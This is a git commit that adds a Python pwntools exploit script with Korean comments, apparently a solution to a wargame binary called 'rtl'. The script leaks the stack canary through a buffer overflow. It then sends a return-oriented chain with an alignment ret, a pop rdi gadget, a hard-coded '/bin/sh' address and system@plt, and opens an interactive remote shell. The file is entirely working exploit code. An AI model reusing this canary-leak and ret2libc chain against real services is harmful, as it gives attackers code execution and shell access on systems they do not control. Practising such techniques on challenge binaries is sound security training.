62f033e6b7925ea3049e60dd8c8a33a5c405e4d7
cooku222 <aftermatter0901@daum.net>
2025-04-23 18:13:57 +0900

    ret2libc.py 코드 추가

---
+++ ret2libc.py
@@ -0,0 +1,30 @@
+from pwn import *
+
+p = remote('HOST', 'domain number')
+e = ELF('./rtl')
+
+def slog(name, addr): return success(': '.join([name, hex(addr)]))
+
+# [1] Leak canary
+buf = b'A' * 0x39
+p.sendafter(b'Buf: ', buf)
+p.recvuntil(buf)
+cnry = u64(b'\x00' + p.recvn(7))
+slog('canary', cnry)
+
+# [2] Exploit
+system_plt = e.plt['system']
+bin_sh = 0x400874 #bin/sh 위치, 직접 구해야함
+pop_rdi = 0x0000000000400853 #system 함수의 첫번째 인자
+ret = 0x0000000000400596 # ROPgadget --binary=./rtl | grep ": ret", modern glibc에서 stack alignment를 점검하게 되어 요새는 16바이트 정렬을 맞춰주어야한다.
+
+payload = b'A'*0x38 + p64(cnry) + b'B'*0x8
+payload += p64(ret)  # align stack to prevent errors caused by movaps
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(system_plt)
+
+pause()
+p.sendafter(b'Buf: ', payload)
+
+p.interactive()
